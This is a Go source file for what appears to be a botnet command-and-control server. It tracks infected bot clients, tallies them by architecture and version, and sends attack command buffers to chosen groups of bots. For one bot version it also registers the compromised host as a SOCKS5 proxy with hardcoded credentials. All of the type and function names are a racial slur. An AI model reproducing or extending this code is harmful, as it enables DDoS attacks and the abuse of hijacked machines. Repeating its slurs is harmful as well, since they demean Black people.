package slave_v2

import (
	"advanced-telnet-cnc/source/config"
	"math/rand"
	"net"
	"sync"
	"time"
)

type NiggerList struct {
	ID int

	Clients map[int]*Nigger
	Proxy   map[*Nigger]string

	Add     chan *Nigger
	Delete  chan *Nigger
	Command chan *NiggerCommand
	Mutex   *sync.Mutex

	totalCount  chan int
	cntView     chan int
	distViewReq chan int
	distViewRes chan map[string]int

	archViewReq chan int
	archViewRes chan map[string]int

	versionViewReq chan int
	versionViewRes chan map[string]int

	count int
}

var (
	List = NewClientList()
)

func NewClientList() *NiggerList {
	c := &NiggerList{
		ID:             0,
		Clients:        make(map[int]*Nigger),
		Add:            make(chan *Nigger, 128),
		Delete:         make(chan *Nigger, 128),
		Command:        make(chan *NiggerCommand),
		Mutex:          &sync.Mutex{},
		Proxy:          make(map[*Nigger]string),
		totalCount:     make(chan int),
		cntView:        make(chan int),
		distViewReq:    make(chan int),
		distViewRes:    make(chan map[string]int),
		archViewReq:    make(chan int),
		archViewRes:    make(chan map[string]int),
		versionViewReq: make(chan int),
		versionViewRes: make(chan map[string]int),
		count:          0,
	}
	go c.makeNiggersWork()
	go c.makeNiggersWorkFaster()
	return c
}

func (list *NiggerList) Count() int {
	list.Mutex.Lock()
	defer list.Mutex.Unlock()

	list.cntView <- 0
	return <-list.cntView
}

func (list *NiggerList) Distribution() map[string]int {
	list.Mutex.Lock()
	defer list.Mutex.Unlock()
	list.distViewReq <- 0
	return <-list.distViewRes
}

func (list *NiggerList) Arches() map[string]int {
	list.Mutex.Lock()
	defer list.Mutex.Unlock()
	list.archViewReq <- 0
	return <-list.archViewRes
}

func (list *NiggerList) Versions() map[string]int {
	list.Mutex.Lock()
	defer list.Mutex.Unlock()
	list.versionViewReq <- 0
	return <-list.versionViewRes
}

func (list *NiggerList) TestForProxy(c *Nigger) {
	host, _, err := net.SplitHostPort(c.RemoteAddr().String())
	if err != nil {
		return
	}

	dial, err := net.Dial("tcp", host+":26721")
	if err != nil {
		return
	}

	defer dial.Close()

	config.Logger.Info("Proxy found", "url", "socks5://RebirthLTD:SOCKS5"+host+":26721")
	list.Proxy[c] = "socks5://RebirthLTD:SOCKS5" + host + ":26721"
}

func (list *NiggerList) AddNigger(c *Nigger) {
	list.Add <- c
	config.Logger.Info("Added nigger", "source", c.Source, "arch", c.Arch, "remote", c.RemoteAddr().String())
	if c.Version == "Rebirth1.0.0" {
		go list.TestForProxy(c)
	}
}

func (list *NiggerList) TerminateNigger(c *Nigger) {
	list.Delete <- c
	config.Logger.Info("Terminated nigger", "source", c.Source, "arch", c.Arch, "remote", c.RemoteAddr().String())
}

func (list *NiggerList) QueueCommandToNiggers(buf []byte, maxNiggers int, niggerCategory string) {
	attack := &NiggerCommand{buf, maxNiggers, niggerCategory}
	list.Command <- attack
}

func (list *NiggerList) makeNiggersWorkFaster() {
	for {
		select {
		case delta := <-list.totalCount:
			list.count += delta
			break
		case <-list.cntView:
			list.cntView <- list.count
			break
		}
	}
}

func (list *NiggerList) makeNiggersWork() {
	rand.Seed(time.Now().UTC().UnixNano())

	for {
		select {
		case add := <-list.Add:
			list.totalCount <- 1
			list.ID++
			add.ID = list.ID
			list.Clients[add.ID] = add
			break
		case del := <-list.Delete:
			list.totalCount <- -1
			delete(list.Clients, del.ID)
			break
		case atk := <-list.Command:
			if atk.Count == -1 {
				for _, v := range list.Clients {
					if atk.Group == "" || atk.Group == v.Source {
						_, err := v.Write(atk.Buffer)
						if err != nil {
							continue
						}
					}
				}
			} else {
				var count int
				for _, v := range list.Clients {
					if count > atk.Count {
						break
					}
					if atk.Group == "" || atk.Group == v.Source {
						_, err := v.Write(atk.Buffer)
						if err != nil {
							continue
						}
						count++
					}
				}
			}
			break
		case <-list.cntView:
			list.cntView <- list.count
			break
		case <-list.distViewReq:
			res := make(map[string]int)
			for _, v := range list.Clients {
				if ok, _ := res[v.Source]; ok > 0 {
					res[v.Source]++
				} else {
					res[v.Source] = 1
				}
			}
			list.distViewRes <- res
		case <-list.archViewReq:
			res := make(map[string]int)
			for _, v := range list.Clients {
				if ok, _ := res[v.Arch]; ok > 0 {
					res[v.Arch]++
				} else {
					res[v.Arch] = 1
				}
			}
			list.archViewRes <- res
		case <-list.versionViewReq:
			res := make(map[string]int)
			for _, v := range list.Clients {
				if ok, _ := res[v.Version]; ok > 0 {
					res[v.Version]++
				} else {
					res[v.Version] = 1
				}
			}
			list.versionViewRes <- res
		}
	}
}
